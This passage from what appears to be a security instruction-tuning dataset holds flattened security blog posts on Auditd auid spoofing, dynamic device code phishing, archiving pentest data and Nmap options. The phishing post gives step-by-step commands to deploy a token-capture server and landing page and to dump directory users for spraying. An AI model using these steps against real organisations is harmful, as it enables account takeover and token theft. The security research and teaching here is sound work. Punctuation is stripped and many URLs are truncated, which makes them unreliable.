tensioners and drop boxes inside of a typical laptop case or backpack Pregnancy Ruse Last but not least a pregnancy ruse could also help you get into many places People are often extra helpful in this situation Although faux pregnancy bellies are not cheap they are effective Hopefully this gives you a few simple ideas to use or expand upon during your next physical security assessment Check out another blog by Joseph about physical pentests Tales From the Pick Intro to Physical Security Tools"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Auditd Field Spoofing: Now You Auditd Me, Now You Auditdon't</title>\n<taxonomies>Informational, Linux, moth, Auditd, C, evasion</taxonomies>\n<creation_date>Thu, 11 May 2023 14:30:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "moth Introduction One fateful night in June of 2022 Ethan sent a message to the crew Anyone know ways to fool Auditd on Linux I'm trying to figure out how to change the auid audit user id field This field remains the same even if you use su or sudo there are other user id fields that track these changes Ethan also helpfully sent a reference link to describe what he was looking at Now do I know Auditd well enough to warrant looking into this myself No Am I a big enough fan of Linux and a big enough fool to throw my hat in the ring anyway Most definitely So what was Ethan's original goal here In short the SOC team was working on building a canary script for spoofing a given auid as well as determining whether the auid value is a reliable source of truth when writing detections for Linux systems If the auid field keeps track of users as they switch users su or run commands with elevated permissions sudo the ability to change this field could be potentially lucrative to attackers Primer With that introduction out of the way we're ready to start researching First things first what is the auid field how is it accessed and crucially how can it be modified From reading the documentation link that Ethan posted it would seem that the auid field is derived from the uid user identifier field and is meant to remain consistent across a process's children even if the uid of the child process is modified For context a uid of 0 represents the root user uid values under 1000 are typically system accounts and uid values from 1000 onward represent standard user accounts The etc passwd file contains the mapping between uids and usernames This information can also be viewed with the getent passwd command Now we get to do something that I Iove having an excuse to do looking at kernel code To do so I'll be using elixir.bootlin.com to browse the kernel source code First let's look for where the auid field is used what initially sets it and where it may be changed From the search results the auid field is logged starting on line 1600 as of kernel version 6.0.19 of kernel audit.c The auid field is retrieved with a function call audit_getloginuid current Location of auid Field in Audit Logging Now that we know how the auid field is retrieved by logging services let's look for the audit_get_loginuid function The function is defined and implemented in the audit header file at include linux audit.h From the function implementation starting on line 199 the function accepts a pointer to a task structure task_struct and returns a field called loginuid from it Contents of audit_get_loginuid Function We're getting closer to the bottom now so it's time to find that field in the task structure definition The task structure can be found in include linux sched.h and is used to contain process information The loginuid field is defined as a structure field but only if CONFIG_AUDIT is defined which makes sense we don't need the loginuid field or related fields if the system isn't configured for auditing Audit-Specific loginuid Task Structure Field From here I began formulating ways that we could write to this field Kernel patching and even a loadable kernel module felt a little too hardcore given the context of this task so I figured it was worth trying to tackle the problem from userspace Unfortunately that marks the end of the kernel source spelunking portion of this adventure Please remember to fill out the tour guide review survey After gaining some insight into the auid field I set out to find a way to modify it I eventually landed on a GitHub commit detailing how and under what conditions the field can be modified Auditd Commit Detailing Login UID Mutability Putting everything together from that commit the current process's auid field should be mutable via proc self loginuid as long as permissions are valid the CAP_AUDIT_CONTROL Linux capability is set and the AUDIT_FEATURE_LOGINUID_IMMUTABLE and AUDIT_FEATURE_ONLY_UNSET_LOGINUID kernel configuration options are not set With all of that information we should be ready to start tackling the problem Now You Auditd Me The initial kernel exploration was illuminating but overall lacking in context To get some context let's take a look at how audit entries are logged Note that the contents shown below have been slightly modified to omit unrelated surrounding log entries in order to make the output cleaner and easier to follow Log file information can be found in var log audit audit.log at least on RHEL systems I first run sudo ls followed by a command to print the last six lines from the log file Note that the executable logged is usr bin sudo and the relevant command is ls which makes sense given what we just ran Sudo Usage Logged with Consistent UID and AUID So now what gets logged when we run sudo su Well as we might expect the audit log shows an entry for the command execution A few entries down we see that the uid field has updated to 0 root but the auid field remains the same as the original user Sudo Usage Logged with Changed UID and Consistent AUID And here we arrive at the task A simple program that assuming we have sudo permissions allows us to manually set the auid field via the proc pid loginuid pseudofile Now You Auditdon't Now that we have our task well and truly researched let's start with the easy ideas first If we can write to the pseudofile do we even need to program anything As much as I love throwing code at a problem this wasn't my problem to begin with so I'll be proceeding with a bit of care for once The Easy Way First what happens if we write to the file directly We should have requisite permissions to write to our own process right Write Operation Not Permitted Apparently not Granted this isn't a permission denied error which would indicate an access error Let's shelve that for now What if we echo the new value and then write that content to the file as sudo Unsuccessful Write Attempt No error that time but still no dice Yet Another Unsuccessful Write Attempt Quick sidebar You might be wondering if proc self is reliable when different processes are spawned per most commands and per user context when using sudo I can say that from testing the behavior was the same when using the specific PID of the current terminal What's even more interesting is that the root user can modify its own loginuid files but not those owned by other user processes Ethan also confirmed that attempting to give cat or tee the CAP_AUDIT_CONTROL capability did not work any better All of this indicates that I'm going to get to throw code at the problem after all With that it's finally time to start slinging some code Here's a fun drinking game for this next section take a little tiny sip of water every time you read the words capability or capabilities to make sure you stay well hydrated The Hard Fun Way Quick aside before we get coding You need to make sure that the libcap-dev Debian or libcap-devel RHEL package is installed on your system before continuing otherwise a requisite header file will not exist Outside of some preliminary argument validation the code I came up with largely boils down to the following five primary components several of which are mainly just error detection and short-circuiting if something goes wonky on us Get process capabilities make sure CAP_AUDIT_CONTROL is supported Set process capabilities to enable the CAP_AUDIT_CONTROL capability Write new auid field to proc self loginuid pseudofile Verify that new auid field was written properly Spawn shell Given that we require specific capabilities to modify the auid field the first step is to retrieve our process capabilities and also determine whether the CAP_AUDIT_CONTROL capability is enabled in our process How do we accomplish this Without an immediate familiarity of programming with capabilities I ran apropos capability in my terminal and received a handful of results Searching for Relevant Manual Pages Checking the manual page for one of the results it appears that most of them point to the header file sys capabilities.h The see also section of the page for cap_clear includes a reference to cap_get_proc which is the function I ultimately ended up using to retrieve the process capabilities It is crucial to note here that including sys capabilities.h requires that the code be compiled with -lcaps so it links against the capabilities library Now that we know what to use to retrieve our process capabilities it would be useful to check whether the CAP_AUDIT_CONTROL capability is supported on my system Conveniently the manual page for cap_get_proc includes a macro predictably named CAP_IS_SUPPORTED The manual page describes it as follows CAP_IS_SUPPORTED cap_value_t cap is provided that evaluates to true 1 if the system supports the specified capability cap If the system does not support the capability this function returns 0 With those pieces of information at our disposal we can construct the first main chunk of the program store the process capabilities in a variable named caps and check for CAP_AUDIT_CONTROL support Segment 1 Capability Retrieval and Enumeration At this point in the code we now have good confidence that the required capability is at least supported on the system The next step involves us creating a new capability list containing CAP_AUDIT_CONTROL using the cap_set_flag function to enable it and then writing the updated capabilities to the process using the cap_set_proc function Segment 2 Capability Construction and Writing With our capabilities written it's time to get and write the new auid value to proc self loginuid To do so we use standard file I O functions to open the file and write our first and only command argument to the file Segment 3 File Opening and New AUID Writing You may have noticed that we didn't close the file used in the previous segment That's because the next segment involves reading back the new value from the file to make sure things were written successfully This step isn't strictly required but given how much trouble we were running into trying to modify the value without code I figured better safe than sorry Once we validate that the value was properly set we close the file and release any memory allocated for the caps variable using the cap_free function Segment 4 File Content Validation and Memory Management Finally we spawn a simple bin bash shell using the execve function Nothing glamorous or especially safe but it gets the job done Segment 5 Shell Spawning That's pretty much all there is to the code You get all that Good Demo After compiling the code with gcc -lcaps capybara.c -o capybara we can see that it's working by using it like so Successful Modification of AUID Field Alright that's fine and all but updating the number as seen by a process is only the first half of our task here What we're really here to do is change the value that gets logged to our audit file After running the code one more time and running sudo whoami for demonstration purposes we can then output some of the contents of var log audit audit.log with a cheeky little Perl regex for added flavor Looking at the first of two highlighted audit log lines we can see something that I failed to notice during my initial development of this with Ethan There's an old-auid field That field only appears to be present when the field is modified On the second highlighted log file entry we see that the whoami command was executed with the correct auid value of 12345 with no mention of the old auid value Parsed Auditd Log Entries Showing old-auid Field So there's a pathway available for analysts to detect Auditd tomfoolery Check for a changing old-auid field to keep track of user IDs as they may be changing That said Ethan later mentioned to me that LOGIN events weren't being surfaced in this particular environment's SIEM adding another wrinkle to the issue of log visibility Conclusion I suppose we should start wrapping this up with some parting thoughts In terms of detection make sure your SIEM is receiving LOGIN events from Auditd so you can be aware of any tampering In terms of possible remediation note that the GitHub commit shown earlier also discusses configuration options named AUDIT_FEATURE_LOGINUID_IMMUTABLE and AUDIT_FEATURE_ONLY_UNSET_LOGINUID which prevent overwriting and unsetting of the auid field respectively From an enterprise Linux standpoint I would imagine those would be good configurations to enable That being said I've looked through configuration options on kernel versions as recent as Linux 6.1.3 and I was unable to find either of those configuration options in a cursory search Apparently there are auditctl commands to set kernel immutability -e 2 and regular loginuid immutability --login-immutability but I have so far been unsuccessful in getting either command to do anything to prevent this technique from working All told this work doesn't represent much of a groundbreaking discovery but seemed to yield satisfactory results for Ethan and the rest of the SOC team What's more this should serve as a reason to be cautious when writing detections around the Auditd facility Depending on how a given organization writes detections or monitors the audit information an attacker could potentially leverage a similar strategy to effectively disappear from view in environments that aren't equipped to detect a changing auid value"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Dynamic Device Code Phishing</title>\n<taxonomies>Blue Team, Incident Response, Informational, InfoSec 301, Phishing, Red Team, Social Engineering, Steve Borosh, Device Code, Microsoft</taxonomies>\n<creation_date>Tue, 16 May 2023 19:55:14 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "rvrsh3ll Introduction This blog post is intended to give a light overview of device codes access tokens and refresh tokens Here I focus on the technical how-to for standing up and operating a Dynamic Device Code phishing campaign I'll cover some key points during the attack flow so operators and defenders will better understand areas to key-in on to help avoid or detect depending on your intent Codes To better understand what a device code is take into consideration when purchasing a new smart television That television may come with apps installed such as Netflix or Hulu Well in order to use those applications you need to sign in to your account Now we don't want to be mashing TV remote buttons all day trying to type out our 24-character password do we No we do not Enter device codes By navigating to etflix.com tv8 we're prompted to enter a code from the TV as seen below Once the correct code is entered on the computer the TV is signed in The same premise applies to device code phishing We as the attacker generate the code to give the user That code is for icrosoft.com devicelogin as seen below When the user signs in with the code we receive the credentials package which includes access and refresh tokens Tokens Access tokens or access_tokens are exactly what they sound like They are JSON web tokens that allow users to securely access Microsoft endpoints such as MSGraph More detailed documentation on access_tokens may be found at earn.microsoft.com en-us azure active-directory develop access-tokens Access tokens are typically good for 1 hour Refresh tokens or refresh_tokens allow users to refresh their access_token for up to 90 days A great way to stay entrenched in a target environment TokenTactics TokenTactics is a PowerShell module for generating device codes and refreshing refresh tokens created by Bobby Cooke 0xBoku and myself Token tactics main feature is the ability to refresh tokens to different audiences Say for example you phished a user and received an MSGraph token If you wanted to use that access to read the user's email you can refresh that token to the Outlook audience endpoint which gives you an access_token for Outlook The token can be played in a POST request via BurpSuite to gain access to Outlook in the browser That's just one example TokenTactics can be used to generate the device codes that you would send to the target user OG Device Code Phishing Device code phishing started with offensive operators having to generate the code in PowerShell and send it to the target user via email or other means One major downside to this is that device codes have a timeout window of 15 minutes That's a very restrictive time frame to work with on a phishing engagement What if the target user doesn't see your phish within that timeframe Well as the phisher you're out of luck We need a better option Dynamic Device Code Phishing In order to enhance our chances for phishing success we need to extend that 15-minute window of opportunity during the phishing campaign To do so I use Azure Web Apps to deploy a static HTML page to an .azurewebsite.net site This site is merely a front while JavaScript performs a GET request to the device code API presents the user with the code and sends a capturecode to us the attacker so that when the target user signs in we receive the token package on a virtual private server running TokenTactics This method extends our window of opportunity as the user's actions generate the device code by browsing to the site Then our 15-minute timeout window begins Since the user has visited the site there's a chance they'll continue to login during that window To better understand this flow I've created a diagram Here are some key points to the diagram Source IP is always where the device code was generated 15 minutes start when visiting the azurewebsite CORS-Anywhere is used to proxy headers back to the user's browser and render the code generation in-browser ithub.com Rob--W cors-anywhere Tokens are received on the captureserver Here's a quick demo video of it in action Defenses I won't be diving into implementation of defenses in this blog post However here are some good starting points in Microsoft documentation and a tip that Conditional Access and Sign-on Protections should be implemented to alert or block users from signing in from unknown locations Don't blindly allow iPhone or Android either because TokenTactics can spoof those devices Initial Defenses Investigate risk Azure Active Directory Identity Protection Microsoft Entra Microsoft Learn Azure AD Conditional Access Azure AD Identity Protection Microsoft Security Using networks and countries regions in Azure Active Directory Microsoft Entra Microsoft Learn Deployment You will first need to be signed in using the How to install the Azure CLI Microsoft Learn You may sign in with az login use-device-code From a PowerShell terminal clone TokenTactics git clone ithub.com rvrsh3ll TokenTactics Clone Azure-App-Tools git clone ithub.com rvrsh3ll Azure-App-Tools Deploy a capture server cd TokenTactics capturetokenphish import-module deploycaptureserver.ps1 Invoke-DeployCaptureServer -ResourceGroup YOURRESOURCEGROUP -location eastus -vmName codecapture -vmPublicDNSName msftdevicecodes -pubKey mykey.pub This will deploy an Azure virtual machine set the FQDN name grab a LetsEncrypt certificate and clone TokenTactics SSH to your server ssh -i mykey azureuser cd TokenTactics Keep this window open and start a new PowerShell terminal Deploy a landing page cd Azure-App-Tools DynamicDeviceCodes Open index.html with VSCode code index.html Change the MyCaptureServer to your Azure FQDN Save Deploy the site using a unique to the Internet YOURNEWSUBDOMAIN az webapp up --location eastus --resource-group YOURRESOURCEGROUP --name YOURNEWSUBDOMAIN --html --sku FREE Your website will deploy to OURNEWSUBDOMAIN.azurewebsites.net Back in your other PowerShell prompt you left open in TokenTactics in your SSH session run your capture server python3 capturetokenphish.py -i 0.0.0.0 -p 8443 Browse to your site to view the device code generation The script sends a device code that is generated with the user_code and is sent via GET id?TOKEN request to the capture server Once the server receives that string PowerShell is loaded to invoke TokenTactics After the user enters the device code we should receive the access and refresh tokens and they will be saved to TokenLog.log Post-Capture You may parse your access_token received client-side at wt.io or with Token Tactics Parse-JWTtoken cmdlet This should give you important information such as the username for the token Tokens may be used with some of your favorite cloud enumeration and hacking tools listed below For a quick win dump all user email addresses with BARK If your access is killed at least you'll have a full list of users to spray or phish again git clone ithub.com BloodHoundAD BARK cd BARK Import-Module Bark.ps1 AllUsers Get-AllAzureADUsers -Token -ShowProgress Also check out this great blog by TrustedSec on what to do with tokens Closing It's important to note that wherever the device code is generated that IP address will show in the logs Keep that in mind when avoiding or implementing conditional access policies Also the authentication package brings MFA along with it So future code refreshes do not require MFA currently Microsoft tokens are a powerful way to authenticate and access Azure and Microsoft 365 resources Use the Microsoft tools available to prevent detect and respond to token abuse I hope this blog post has helped defenders to better protect their network while providing offensive operators with another technique to test and enhance enterprise defenses Black Hills Information Security BHIS uses dynamic device code phishing along with other techniques against its continuous testing clients to assess phishing prevention detection and response capabilities tied to Azure Active Directory Microsoft 365 and their associated security boundaries BHIS has had mixed success with dynamic device code phishing Some clients have detected the phish as credential phishing Some have had automated solutions detect the email vector and remove the email from inboxes Others have strict conditional access policies that help mitigate this attack There are key detection and prevention points in the attack chain as outlined in the blog Still we test the assumption of security Trust and verify"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Six Tips for Managing Penetration Test Data</title>\n<taxonomies>General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, John Malone, Archive, data, testing</taxonomies>\n<creation_date>Thu, 25 May 2023 16:29:30 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Malone An Archive IRL Introduction Information is power This sentiment also holds true when discussing the creation of a supporting archive A supporting archive is something that we put together to help inform our customers of our test findings and provide them the most relevant information It should be a resource that contains evidence and artifacts from a penetration test that allows the tester to draw on information to further their attack strategy while simultaneously providing benefit to a customer so they may better enhance their security posture Ideally the security tester you will want to interact with the data and supporting archive in your terminal Doing so will allow for rapid logging and interaction with content through the command line which can prove exceptionally powerful when dealing with and searching through vast quantities of information In this post we will briefly discuss how we may best manage our data and create a strong supporting archive Tip 1 Dedicate Space for Your Data When working through a penetration test you will want to first ensure that you have a place within your file system that is only for the data that will help you construct your supporting archive Nothing else should be saved there with the exception of information that is directly relevant to your penetration test For example consider the following directory path home tester testing This file path points to the home directory of the user tester and a subdirectory simply named testing or the name of a customer Figure 1 Your Archive Starts Here While it may seem like a mundane concept dedicating a space to your testing data will help minimize the chances of contamination by irrelevant data and maximize the likelihood of your final product being easy to find and simple to navigate After creating your dedicated folder consider splitting it into additional subdirectories that further separate the contents based on what tools you will be using You can certainly feel free to add more during your test but laying things out and making them a standard part of any testing environment you use will save you time and will allow you to implement some time-saving scripting practices which will be discussed later For example we may have the following directories in our space home tester testing nmap home tester testing gobuster home tester testing cryptography home tester testing eyewitness home tester testing impacket home tester testing recon home tester testing crackmapexec An example is shown in the screenshot below Figure 2 Supporting Archive Contents My preferred naming convention for tests is home malone CLIENT-NAME testing Feel free to use whatever naming convention you prefer With that established we can carry this information with us to our next tip which emphasizes the importance of understanding your tools so that you are able to extract the highest quality of information for your data Tip 2 Understand Command Syntax and Piping When working with testing tools it is common to see tools that support outputting results to a specific file For example we can configure Nmap to run with the switches -oN for normal output or -oX for XML output While these methods often have their own unique case uses for the intent of a thorough supporting archive we would want to rely on -oN The reason for this is that normal output is a simple text file that contains our information Simplicity is a good thing and can allow us to use equally simple commands to extract meaningful information Additionally you could utilize the oA switch depending on what you are looking for This switch will provide you with normal XML and greppable output all at once For this example we will stick with oN Below is an example command that makes use of this feature nmap -vvv -Pn -T4 -sV 192.168.1.1 -oN home tester nmap 192.168.1.1.txt This command instructs Nmap to provide very very verbose output -vvv to treat all hosts as being alive -Pn to scan quickly T4 to target an IP address and to save the output of that IP address as normal output -oN By doing this we are able to generate a text file that contains simple output and most importantly that is saved to our supporting archive at the designated location for this tool Figure 3 Nmap Command In Action It is worth noting that some tools either by choice or by design oversight may not always include tools for outputting their information In this case we can make use of the following command tee -a home tester testing TOOL FILENAME This command tee -a allows us to append information to an arbitrary location within our computer system or our supporting archive This command is relatively useless in this format on its own but becomes a powerful logging tool when we combine it with our previous command Even though Nmap supports logging for the sake of this example we can pretend that it does not and obtain the same result with the following command nmap -vvv -Pn -T4 -sV 192.168.1.1 tee -a home tester testing 192.168.1.1-nmap.txt This command will perform the same scan as the above Nmap command but will now output the content directly to the desired file We can utilize tee in this manner to ensure that we capture information quickly Tip 3 Supercharge Your Archive via Scripting When testing in a real-life environment you may find yourself needing to engage in all sorts of activities which when performed manually would result in excessive amounts of consumed time These activities be they host discovery enumeration or even exploitation can be made exceptionally easier with the use of BASH scripting in your terminal When combined with the above tips you can quickly weave together scripts which will not only perform your desired operation with the tool of your choice but will also construct a clean and complete area of your supporting archive In my opinion the best way to do this is with the use of for loops For this example we will utilize the same Nmap command as above but will this time apply it to an entire range of hosts We will also break the below command down into its individual components to ensure maximum clarity Also kindly take note of the bolded text for IP in cat home tester testing targets.txt do nmap -vvv -Pn -T4 -sV IP -oN home tester testing nmap IP.txt done This command known as a for loop is named for the first word within the command which is for Let's break this down into three parts Our command begins with for IP in cat home tester testing targets.txt Here we are saying Hey computer for each IP that we find on each line when we read targets.txt This snippet is an argument that we are setting for the rest of our command which comes after our semicolon More on that later Some who are savvy with Nmap may realize that a similar approach could be to simply feed Nmap a wordlist with the -iL switch and forgo the for loop altogether However doing it this way will produce a single log file containing all scans Using a for loop will instead generate multiple log files for all IPs This as we will cover later will allow you to extract data in a way that allows you to rapidly parse information belonging to each host Before we go on it is important to note that IP is an arbitrary value We could name this thing which is a variable whatever we want We could call it i or blahblahblah or whatever and our results would be the same provided we also reflect that on all other bolded text within our command Our semicolon then tells our script that we will be providing another argument This argument is do nmap -vvv -Pn -T4 -sV IP -oN home tester testing nmap IP.txt What we are now saying is Hey computer for each IP that we find on each line when we read targets.txt please DO this Nmap command and insert the value of the IP you are reading into each instance of IP in our command Our semicolon once again prepares the script for the last argument which is simply done This tells our loop to terminate after reading through our list in targets.txt To bring the entire command full circle you have now said Hey computer for each IP that we find on each line when we read targets.txt please DO this Nmap command and insert the value of the IP you are reading into each instance of IP in our command Then quit To bring this all together say our list of targets is 10.0.1.5 10.0.1.7 10.0.1.9 And say we run the following script in our terminal for IP in cat home tester testing targets.txt do nmap -vvv -Pn -T4 -sV IP -oN home tester testing nmap IP.txt done This will perform the same instructions as the following three commands nmap -vvv -Pn -T4 -sV 10.0.1.5 -oN home tester nmap 10.0.1.5.txt nmap -vvv -Pn -T4 -sV 10.0.1.7 -oN home tester nmap 10.0.1.7.txt nmap -vvv -Pn -T4 -sV 10.0.1.9 -oN home tester nmap 10.0.1.9.txt Going by what we have explored already you can see that our BASH script will generate thorough logs for all targets within your targets.txt However we are saving ourselves a great deal of time as our for loop needs to only be entered once leaving Nmap to scan our three or our three hundred or three thousand hosts for us This saves us time and ensures that our supporting archive contains the maximum amount of information Figure 4 List of Nmap Logs Generated by a For Loop When turned into a habit this practice will help ensure maximum efficiency and logging accuracy Tip 4 Let Your Data Work for You Not to turn this into a programming class but the data you will collect while testing becomes a rather powerful testing tool provided you treat it with love and care and keep it organized With that said your archive can grow off of itself as long as you implement a clever scripting plan that allows it to do so By combining all of our previous tips we now have A dedicated workspace An understanding of our tooling An understanding of how to use our tooling with scripting to build out our archive By all means we can completely end this article here and send you on your merry way but we couldn't call ourselves hackers if we didn't think of clever ways to utilize the information we gain could we With the above bullet points in mind we can now use our archive in a way that allows it to further build on itself thereby saving us even more time This time due to the nature of our work can instead be put towards polishing that beautiful penetration test report or engaging in manual testing while your tools chug away and your archive builds itself For this example I have drafted a script that follows the following steps Discover hosts that are alive within a given scope and generate a list of targets Use the list of targets to conduct a port scan and save the results to the archive Use the port scan results to produce a report for webservers that is stored in the archive Use the port scan results to enumerate cryptography for all webservers and you probably guessed it store the results within your archive As a challenge consider the above tips while you review the code to look for the rhyme and rhythm behind what the tool is doing Also small disclaimer This script is nowhere near perfect However I do feel that it illustrates the concepts discussed in this posting well enough and is applicable to help build out a starting point for an archive Feel free to steal this and use modify it to your heart's content And most importantly be creative in your own scripting efforts bin bash Make sure we have our IP ranges stored in CIDR format in home tester testing range.txt before we launch this script or it won't work Build our Archive mkdir home tester testing mkdir home tester testing nmap mkdir home tester testing eyewitness mkdir home tester testing cryptography Generate a list of living hosts from text file containing CIDR ranges in our pen test scope and save to archive for i in cat home tester testing range.txt do fping -g i tee -a home tester testing fping-sweep.txt done Trimming our list of living hosts into a usable list of targets and outputting it to targets.txt in our archive cat fping-sweep.txt grep alive cut -d -f 1 home tester testing targets.txt Now use targets.txt for our Nmap scans to build out Nmap section of Supporting Archive and prepare for additional enumeration echo beginning Nmap scan for i in cat home tester testing targets.txt do echo testing i nmap -p -vvv -sV -T4 -Pn i -oN i.txt done echo Doing it again but in one XML file so we can build out an EyeWitness section for the Archive nmap -p -vvv -T4 -Pn -iL home tester testing targets.txt -oX home tester testing eyewitness-targets.xml echo nmap complete Now use our Nmap .XML file to build our EyeWitness Report and save it to our Archive home tester testing EyeWitness Python EyeWitness.py -x home tester testing eyewitness-targets.xml --web --timeout 60 --user-agent Mozilla 5.0 X11 Linux x86_64 rv 91.0 Gecko 20100101 Firefox 91.0 -d home tester testing eyewitness-report echo EyeWitness Complete Visit testing directory parse a list of hosts and ports for Cryptographic Analysis cd home tester testing nmap ports ag http grep .txt cut -d -f 1 3 cut -d -f 1 sed 's .txt g home tester testing crypto-targets.txt Using our crypto-targets.txt file with testssl.sh to generate Cryptography section for Supporting Archive we won't need tee -a for this one echo Starting testssl.sh and evaluating the cryptography of our webservers for i in cat home tester testing crypto-targets.txt do testssl --warnings batch --log i done echo We're done here After creating a script like this and saving it to a file you can simply chmod x scriptname.sh in your terminal and then run the script scriptname.sh This script follows a chain that puts into practice all of the tips we have discussed so far It builds our archive in its own unique place Using a list of IP CIDR ranges it generates a list of hosts that are alive and creates a log file of those living hosts targets.txt This is saved to our archive It uses the new targets.txt file to perform two Nmap operations The first operation enumerates all of our hosts that are alive The second operation generates an XML file which will be used to empower EyeWitness All files are saved to the supporting archive EyeWitness enumerates webservers contained within the Nmap XML file and saves its report to our supporting archive We then use ag a terminal-based searching platform and regex to parse out a list of hosts that were detected to be running webservers This is saved to the supporting archive Our script then calls testssl.sh to evaluate the cryptography of all target webservers and their respective ports These logs are then also saved to the supporting archive After coming this far and adhering to these principles you should have a significant amount of information for your supporting archive Granted this is simply a method I use to gather low-hanging fruit during an assessment Feel free to design your own scripts but ensure they adhere to a philosophy of generating strong logs and building evidence for your archive Tip 5 Use the Silver Searcher to Rapidly Search Collected Data ag is a fantastic searching tool within Kali and has helped do everything from refreshing my memory mid-test to creating screenshots that I feel share quite a bit of good information ag is a search tool that can be invoked with ag This command provided you have been making use of BASH for loops and have been outputting information to files can be used to rapidly identify important information For example if I wanted to search my Nmap scan results for open ports I could cd into my Nmap directory and simply issue ag open This command will pull a list of files containing the word open Seeing how Nmap uses the word open to describe port status this can be used to rapidly pull down neatly trimmed information about open ports on each host Figure 5 ag Pulls Open Ports This is great because it not only allows you to rapidly look at the crucial information about open ports but the data can be trimmed even further with something like the below command which will rapidly produce a list of hosts running SSH ag open grep ssh sort -Vu Figure 6 ag Results Trimmed Further with grep Similarly you can use this to investigate directory enumeration results to immediately pull up valid directory names that returned a certain HTTP status code ag 200 Figure 7 ag Locates Valid Directories in Gobuster Log Additionally you can even look up information related to cryptographic vulnerabilities ag sweet grep VULNERABLE Figure 8 ag Locates Cryptographic Vulnerabilities in Host Logs With a well-managed supporting archive and a bit of creativity ag can provide you with immense levels of power and flexibility that allow for the rapid retrieval of information I hope I've sold you on it However it's worth noting that this tool does dig recursively Thus it is best to use it within a directory from which you wish to perform your search You can also specify the level to which it searches recursively with the --depth switch Using it in a directory that is higher-level such as will return many results outside of what you were probably looking for However ag is also a great way to scrape mounted shares for information about stored passwords You could utilize ag password or a similar variation to search an entire mounted share for potential credentials but that is a conversation for a different time Tip 6 Be Okay with Adding Things Manually and with Throwing Stuff Away Don't worry we're done with the technical stuff It's worth remembering that no two penetration tests are ever the same Thus it is never appropriate to simply fire a script and assume your archive is finished If you have a steady baseline approach that allows you to obtain precious information on your targets like the above script feel free to use it but prepare to also add additional information to your archive while you are testing Similarly you should also be prepared to exclude things from your supporting archive especially if they consist of information that may be very sensitive such as usernames and hashes from an NTDS.DIT dump from a domain controller during an internal test or personal information like plaintext social security numbers That is information you really really do not want getting into the wrong hands While you are testing you should consider everything that you see as something that you can potentially add to an archive especially if it is something you find manually Remember your customer is going to be getting your archive along with a report Consider going the extra mile and copying something interesting from a Metasploit module or Recon-NG directly into a text file Conclusion If you've followed these steps and are on a test it is likely that you now have a fairly detailed supporting archive that is organized contains relevant information about the test and tells a story that is helpful for you and the client As the saying goes it's fine to hack for show but you're going to want to report well for the dough With the supporting archive being a quintessential piece of the reporting experience it is important that it receives your full attention and care when being built Until next time"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Shenetworks Recommends: Using Nmap Like a Pro</title>\n<taxonomies>Recon, Serena DiPenti</taxonomies>\n<creation_date>Mon, 05 Jun 2023 19:23:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "shenetworks One day at work I received a case stating a client couldn't connect to the management interface of a new server I asked the client to change the IP address of the management interface and try to connect and the test was successful The client was confused and asked why the original IP address wouldn't work I asked them to ping the old address and the client was surprised to receive a response back That IP address was assigned to a device somewhere else on the network While there are new programs that can help manage your IP addresses and ranges this is still a common issue in networks Often caused by poor documentation and stale configurations The client then had the task of tracking down this rogue IP Where would you start this process I would say Nmap is a perfect tool Nmap is extremely popular for both defenders and attackers It originally debuted in Phrack Magazine in 1997 by the author Gordon Fyodor Lyon Nmap has grown into a more complex and powerful tool since its release As a Network Engineer I used Nmap to scan for inventory and to check availability and uptime As a pentester I use Nmap to gather information on my targets and with some scripts Nmap can be used for a lot more than reconnaissance Since Nmap has so many options it might be overwhelming to parse through them to see which ones will be beneficial to you The next section discusses Nmap options and scripts that I frequently use and recommend A basic default Nmap scan will probe a target and check for a response Once Nmap has verified the host is reachable Nmap will probe for open ports The default Nmap scan is helpful but with a few options we can get a lot more information Nmap scan types options target s Figure 1 Nmap help page list of options -sL List Scan You might want to audit a range of IP addresses knowing some of those IP addresses are unused Using Nmap with the -sL option will probe every IP address in the given range and do a reverse-DNS lookup Domain names can often help identify valuable targets The result will be a list of reachable hosts and their domain name if applicable -sV Version Discovery Nmap option -sV will attempt to discover the version information of every port open on a host This information is extremely valuable on an engagement This will help you identify what type of host you're probing and the version number Identifying the version helps prioritize interesting targets and identify available exploits -Pn Skip host discovery It's common for network administrators to disable the ICMP protocol or filter traffic to certain hosts The option -Pn skips host discovery and assumes every IP address is assigned to a host and online Using this option Nmap can discover additional targets but increase the scan time significantly -p Scan every port By default Nmap scans 1000 ports Some services may be open but not discoverable with a standard scan Using the -p option will scan every port 1-65535 This option will increase the duration 